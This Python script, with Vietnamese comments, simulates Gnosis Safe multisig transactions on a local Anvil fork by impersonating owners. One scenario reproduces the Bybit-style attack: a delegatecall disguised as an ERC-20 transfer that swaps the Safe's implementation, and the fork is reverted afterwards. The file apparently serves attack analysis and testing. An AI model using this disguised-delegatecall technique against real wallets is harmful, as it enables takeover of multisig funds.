"""
simulator.py — Mô phỏng giao dịch Safe ĐẦY ĐỦ qua execTransaction trên Anvil fork.

Quy trình (không cần private key):
  1. Lấy safeTxHash từ chính Safe (thứ người ký thấy trên ví phần cứng)
  2. Impersonate đủ `threshold` owner, mỗi owner gọi approveHash(safeTxHash)
  3. Ghép chữ ký kiểu "approved hash" (v=1) theo thứ tự địa chỉ owner tăng dần
  4. Gọi execTransaction → operation=1 thực sự delegatecall trong storage của Safe
Dùng snapshot()/revert() bên ngoài để trả fork về trạng thái cũ sau mỗi kịch bản.
"""

import os

from eth_abi import encode
from web3 import Web3

from state_reader import read_state, load_env

ZERO = "0x0000000000000000000000000000000000000000"
RPC_DEFAULT = "http://localhost:8545"

SAFE_EXEC_ABI = [
    {"inputs": [], "name": "nonce", "outputs": [{"type": "uint256"}],
     "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "getOwners", "outputs": [{"type": "address[]"}],
     "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "getThreshold", "outputs": [{"type": "uint256"}],
     "stateMutability": "view", "type": "function"},
    {"inputs": [
        {"name": "to", "type": "address"}, {"name": "value", "type": "uint256"},
        {"name": "data", "type": "bytes"}, {"name": "operation", "type": "uint8"},
        {"name": "safeTxGas", "type": "uint256"}, {"name": "baseGas", "type": "uint256"},
        {"name": "gasPrice", "type": "uint256"}, {"name": "gasToken", "type": "address"},
        {"name": "refundReceiver", "type": "address"}, {"name": "_nonce", "type": "uint256"}],
     "name": "getTransactionHash", "outputs": [{"type": "bytes32"}],
     "stateMutability": "view", "type": "function"},
    {"inputs": [{"name": "hashToApprove", "type": "bytes32"}],
     "name": "approveHash", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [
        {"name": "to", "type": "address"}, {"name": "value", "type": "uint256"},
        {"name": "data", "type": "bytes"}, {"name": "operation", "type": "uint8"},
        {"name": "safeTxGas", "type": "uint256"}, {"name": "baseGas", "type": "uint256"},
        {"name": "gasPrice", "type": "uint256"}, {"name": "gasToken", "type": "address"},
        {"name": "refundReceiver", "type": "address"}, {"name": "signatures", "type": "bytes"}],
     "name": "execTransaction", "outputs": [{"type": "bool"}],
     "stateMutability": "payable", "type": "function"},
]


def snapshot(w3: Web3) -> str:
    """Chụp trạng thái fork hiện tại, trả về id để revert."""
    return w3.provider.make_request("evm_snapshot", [])["result"]


def revert(w3: Web3, snap_id: str):
    """Đưa fork về đúng trạng thái lúc snapshot."""
    ok = w3.provider.make_request("evm_revert", [snap_id])["result"]
    if not ok:
        raise RuntimeError(f"evm_revert({snap_id}) thất bại")


def _impersonate(w3: Web3, addr: str):
    w3.provider.make_request("anvil_impersonateAccount", [addr])
    w3.provider.make_request("anvil_setBalance", [addr, hex(10 * 10**18)])


def _stop_impersonate(w3: Web3, addr: str):
    w3.provider.make_request("anvil_stopImpersonatingAccount", [addr])


def build_approved_signatures(signers: list[str]) -> bytes:
    """
    Chữ ký approved-hash cho mỗi owner (65 byte): r = địa chỉ owner, s = 0, v = 1.
    Safe yêu cầu sắp xếp theo địa chỉ owner tăng dần.
    """
    sigs = b""
    for owner in sorted(signers, key=lambda a: int(a, 16)):
        r = bytes.fromhex(owner[2:]).rjust(32, b"\x00")
        s = b"\x00" * 32
        v = b"\x01"
        sigs += r + s + v
    return sigs


def simulate_safe_tx(w3: Web3, safe_address: str, to: str, data: str = "0x",
                     value: int = 0, operation: int = 0, gas: int = 3_000_000) -> dict:
    """Thực thi một Safe transaction trên fork như thể đã đủ chữ ký."""
    safe_address = Web3.to_checksum_address(safe_address)
    safe = w3.eth.contract(address=safe_address, abi=SAFE_EXEC_ABI)
    to = Web3.to_checksum_address(to)
    data_bytes = Web3.to_bytes(hexstr=data)

    nonce = safe.functions.nonce().call()
    safe_tx_hash = safe.functions.getTransactionHash(
        to, value, data_bytes, operation, 0, 0, 0, ZERO, ZERO, nonce
    ).call()

    owners = safe.functions.getOwners().call()
    threshold = safe.functions.getThreshold().call()
    signers = owners[:threshold]

    for o in signers:
        _impersonate(w3, o)
    try:
        # Mỗi owner "ký" bằng approveHash
        for o in signers:
            h = safe.functions.approveHash(safe_tx_hash).transact({"from": o, "gas": 100_000})
            w3.eth.wait_for_transaction_receipt(h)

        signatures = build_approved_signatures(signers)
        tx_hash = safe.functions.execTransaction(
            to, value, data_bytes, operation, 0, 0, 0, ZERO, ZERO, signatures
        ).transact({"from": signers[0], "gas": gas})
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    finally:
        for o in signers:
            _stop_impersonate(w3, o)

    return {
        "status": receipt.status,
        "gas_used": receipt.gasUsed,
        "tx_hash": w3.to_hex(tx_hash),
        "safe_tx_hash": w3.to_hex(safe_tx_hash),
        "nonce_used": nonce,
        "signers": signers,
    }


if __name__ == "__main__":
    env = load_env()
    rpc = os.getenv("RPC_URL", RPC_DEFAULT)
    w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 60}))
    safe_addr = env["SAFE_ADDRESS"]
    mal = Web3.to_checksum_address(env["MALICIOUS_IMPL"])

    # Payload ngụy trang: transfer(MaliciousImpl, 0) — selector giống ERC-20 transfer
    attack_data = "0xa9059cbb" + encode(["address", "uint256"], [mal, 0]).hex()

    scenarios = [
        {"label": "Hợp lệ: gọi rỗng tới owner #2 (operation=0)",
         "to": "0x70997970C51812dc3A010C7d01b50e0d17dc79C8", "data": "0x", "operation": 0},
        {"label": "Tấn công Bybit: delegatecall transfer() ngụy trang (operation=1)",
         "to": mal, "data": attack_data, "operation": 1},
    ]

    for sc in scenarios:
        print(f"\n=== {sc['label']} ===")
        snap = snapshot(w3)
        try:
            before = read_state(rpc, safe_addr)
            res = simulate_safe_tx(w3, safe_addr, sc["to"], sc["data"], 0, sc["operation"])
            after = read_state(rpc, safe_addr)
            print(f"  safeTxHash : {res['safe_tx_hash']}")
            print(f"  status     : {res['status']}   gas: {res['gas_used']}")
            print(f"  masterCopy : {before['masterCopy']} -> {after['masterCopy']}")
            print(f"  nonce      : {before['nonce']} -> {after['nonce']}")
            print(f"  owners     : {len(before['owners'])} -> {len(after['owners'])}   "
                  f"threshold: {before['threshold']} -> {after['threshold']}")
        finally:
            revert(w3, snap)

    final = read_state(rpc, safe_addr)
    print(f"\nSau revert: masterCopy={final['masterCopy']}  nonce={final['nonce']}")